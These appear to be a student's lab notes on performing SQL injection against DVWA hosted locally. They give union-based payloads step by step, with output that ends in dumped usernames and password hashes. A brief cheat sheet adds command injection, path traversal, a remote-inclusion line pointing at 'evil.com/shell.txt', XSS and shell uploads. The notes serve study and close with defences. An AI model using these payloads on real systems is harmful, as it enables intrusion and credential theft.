---
Title: Lab 7 SQL Injection
Status:
marker:
  - "[[Cybersecurity Fundamentals]]"
tags:
Date: 2025.09.09
Time: 10:30
---
# Lab 7 SQL Injection

## Aim 
To Perform SQL Injection on a locally hosted website. 

## Tools
### Xampp
XAMPP's a service manager. We need to host something called [[#DVWA]] and to establish that we need these services running locally.
- MySQL
	- Database
- Apache
	- Web Servers
### **DVWA Quick Integrations

#### **Setup**
- Run on **XAMPP/WAMP/LAMP**.
- Access: `http://localhost/DVWA`.
#### **Security Levels**
- **Low/Medium/High**: Increasing security controls.
#### **Vulnerabilities**
- **Brute Force**: Weak login → Use **Hydra**.
- **Command Injection**: `; ls` or `| cat /etc/passwd`.
- **CSRF**: Trick users into submitting malicious requests.
- **File Inclusion**: LFI (`../../../../etc/passwd`), RFI (`http://evil.com/shell.txt`).
- **File Upload**: Bypass filters → Upload `.php` shells.
- **SQLi**: `' OR '1'='1` → Use **SQLmap**.
- **XSS**: Inject `<script>alert(1)</script>`.
- **CAPTCHA Bypass**: Automate with OCR.
- **Session Hijacking**: Steal cookies.
#### **Tools**
- **Burp Suite**, **SQLmap**, **Nmap**.
#### **Defenses**
- Input validation, prepared statements, CSRF tokens.


# Lab Work
After turning on the **Apache** and **DVWA** services open the `https://127.0.0.1/dvwa` where dvwa is hosted. 
Go to the **DVWA Security** Tab and select the difficulty level to be low as we are beginners.

As we are trying to learn SQL Injection we move to the SQL Injection Panel from the dashboard.

### Understanding the backend
The DVWA Backend looks something like this. We always might not know what the backend looks like but we can guess. But for beginners we will keep this here
```php
$id = $_GET['id'];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
$result = mysqli_query($GLOBALS["___mysqli_ston"], $query);
```

```sql
SELECT first_name, last_name 
FROM users 
WHERE user_id = '<input>';
```

### First Query
Entering the Specific User ID will show that specific record.
![[IMG-20250918102128249.png|300 center]]
### Second Query
Manipulating the Query to get an always true condition.

#### **Query**
- Since this is a user id matching case % will not exist in the database as those are usually int so the first condition is false
- But the other condition we have added with the **OR** logic is `'0'='0'`. ( Note : The Apostrophe is missing to compensate for the already existing one in the code ) . 
- With the other condition being `true` and the **OR** logic our condition is always true and it will return every query.
```sql
%' or '0'='0
```


```js
ID:  %'or'0'='0' union select null, version()#  
First name: admin  
Surname: admin

ID:  %'or'0'='0' union select null, version()#  
First name: Gordon  
Surname: Brown

ID:  %'or'0'='0' union select null, version()#  
First name: Hack  
Surname: Me

ID:  %'or'0'='0' union select null, version()#  
First name: Pablo  
Surname: Picasso

ID:  %'or'0'='0' union select null, version()#  
First name: Bob  
Surname: Smith

ID:  %'or'0'='0' union select null, version()#  
First name:   
Surname: 10.4.22-MariaDB
```

![[IMG-20250918102128324.png|550 center]]

### 3. Query
- the `#` parameter
	- In sql the `#` parameter comments out the line where it is placed
	- So placing it in the end of the query renders everything else as a comment
- ( Need to figure out why union select null was done here? Perhaps just to get version?? but that could've been done without the select null )
```sql
Input %' or '0'='0' union select null,version()#
```

```js
ID:  %'or'0'='0' union select null, version()#  
First name: admin  
Surname: admin

ID:  %'or'0'='0' union select null, version()#  
First name: Gordon  
Surname: Brown

ID:  %'or'0'='0' union select null, version()#  
First name: Hack  
Surname: Me

ID:  %'or'0'='0' union select null, version()#  
First name: Pablo  
Surname: Picasso

ID:  %'or'0'='0' union select null, version()#  
First name: Bob  
Surname: Smith

ID:  %'or'0'='0' union select null, version()#  
First name:   
Surname: 10.4.22-MariaDB
```
![[IMG-20250918102129335.png|center]]

### Query 4 
- Like the last one we added a comment at the end
- And we checked with what permission elevation is the SQL Api Running. 
- We determined it runs with `root@localhost` 
```sql
Input %' or 0=0 union select null, user() #
```

```js
ID: %' or 0=0 union select null, user()#  
First name: admin  
Surname: admin

ID: %' or 0=0 union select null, user()#  
First name: Gordon  
Surname: Brown

ID: %' or 0=0 union select null, user()#  
First name: Hack  
Surname: Me

ID: %' or 0=0 union select null, user()#  
First name: Pablo  
Surname: Picasso

ID: %' or 0=0 union select null, user()#  
First name: Bob  
Surname: Smith

ID: %' or 0=0 union select null, user()#  
First name:   
Surname: root@localhost
```
![[IMG-20250918102129831.png|center]]
### Query 5
- Similar to the last 2 queries
	- We run the database() function this time to determine the database running this server
> [!Warning ] Alert
> For some reason the database type is not there in the output

```sql
input %' or 0=0 union select null, database()#
```

```js
ID:  input %' or 0=0 union select null, database()#  
First name: admin  
Surname: admin

ID:  input %' or 0=0 union select null, database()#  
First name: Gordon  
Surname: Brown

ID:  input %' or 0=0 union select null, database()#  
First name: Hack  
Surname: Me

ID:  input %' or 0=0 union select null, database()#  
First name: Pablo  
Surname: Picasso

ID:  input %' or 0=0 union select null, database()#  
First name: Bob  
Surname: Smith

ID:  input %' or 0=0 union select null, database()#  
First name:   
Surname: dvwa
```
![[IMG-20250918102130254.png|center]]
### Query 6
- To **enumerate all tables** in the database.
- Function/target:
    - `information_schema.tables` → a special system table in MySQL that lists **all tables in all databases**.
    - `table_name` → the name of each table.
- Using SQLi, this helps attackers (or lab students) know which tables exist before trying to extract user data.

```sql
input %'and 1=0 union select null, table_name from information_schema.tables#
```

```js
ID:  input %'and 1=0 union select null, table_name from information_schema.tables#  
First name:   
Surname: ALL_PLUGINS

ID:  input %'and 1=0 union select null, table_name from information_schema.tables#  
First name:   
Surname: APPLICABLE_ROLES

ID:  input %'and 1=0 union select null, table_name from information_schema.tables#  
First name:   
Surname: CHARACTER_SETS

ID:  input %'and 1=0 union select null, table_name from information_schema.tables#  
First name:   
Surname: CHECK_CONSTRAINTS

ID:  input %'and 1=0 union select null, table_name from information_schema.tables#  
First name:   
Surname: COLLATIONS

ID:  input %'and 1=0 union select null, table_name from information_schema.tables#  
First name:   
Surname: COLLATION_CHARACTER_SET_APPLICABILITY

ID:  input %'and 1=0 union select null, table_name from information_schema.tables#  
First name:   
Surname: COLUMNS

ID:  input %'and 1=0 union select null, table_name from information_schema.tables#  
First name:   
Surname: COLUMN_PRIVILEGES
```

![[IMG-20250918102130575.png|center]]
### Query 7 
- To **filter only tables related to users**.
- In large databases, there are many tables (like `ALL_PLUGINS`, `COLUMNS`, etc.).
- Using `LIKE 'user%'` returns only tables whose names **start with `user`**, e.g., `users`, `user_privileges`, `user_variables`.
```sql
%' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
```

```js
ID: %' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#  
First name:   
Surname: USER_PRIVILEGES

ID: %' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#  
First name:   
Surname: USER_STATISTICS

ID: %' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#  
First name:   
Surname: user_variables

ID: %' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#  
First name:   
Surname: users

ID: %' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#  
First name:   
Surname: user
```
![[IMG-20250918102130829.png|center]]

### Query 8
- To **list all columns** of the `users` table.
- `information_schema.columns` → system table that stores **column metadata** for all tables.
- `concat(table_name,0x0a,column_name)` → combines the table name and column name with a **newline (`0x0a`)** to make it readable in DVWA output
```sql
%' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name='users'#
```

![[IMG-20250918102130968.png|center]]
```sql
ID: %' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name='users'#  
First name:   
Surname: users
user_id

ID: %' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name='users'#  
First name:   
Surname: users
first_name

ID: %' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name='users'#  
First name:   
Surname: users
last_name

ID: %' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name='users'#  
First name:   
Surname: users
user
```

### Query 9
- To **extract actual user data** from the `users` table.
- Uses the `concat()` function to combine multiple columns into **one output column**, separated by `0x0a` (newline).
- Targets sensitive information: `first_name`, `last_name`, `user`, `password`.
```sql
%' and 1=0 union select null,
concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users#
```

```js
ID: %' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users#  
First name:   
Surname: admin
admin
admin
5f4dcc3b5aa765d61d8327deb882cf99

ID: %' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users#  
First name:   
Surname: Gordon
Brown
gordonb
e99a18c428cb38d5f260853678922e03

ID: %' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users#  
First name:   
Surname: Hack
Me
1337
8d3533d75ae2c3966d7e0d4fcc69216b

ID: %' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users#  
First name:   
Surname: Pablo
Picasso
pablo
0d107d09f5bbe40cade3de5c71e9e9b7

ID: %' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users#  
First name:   
Surname: Bob
Smith
smithy
5f4dcc3b5aa765d61d8327deb882cf99
```

## Questions
#### Question 1
**Types:**
1. **In-band SQLi:** Data is retrieved using the same channel (e.g., error-based, union-based).
2. **Inferential (Blind) SQLi:** No data returned directly; attacker infers information via server responses (e.g., boolean-based, time-based).    
3. **Out-of-band SQLi:** Data retrieved via a different channel (e.g., email, DNS) when server supports it.

#### Question 2
- **Input Validation:** Reject or sanitize unsafe input.
- **Prepared Statements / Parameterized Queries:** Bind variables instead of concatenating strings.
- **Stored Procedures:** Limit direct SQL execution.
- **Least Privilege:** Restrict database user permissions.
- **Web Application Firewall (WAF):** Detect and block suspicious requests.
- **Error Handling:** Avoid exposing detailed database errors to users.
# References


###### Information
- date: 2025.09.09
- time: 10:30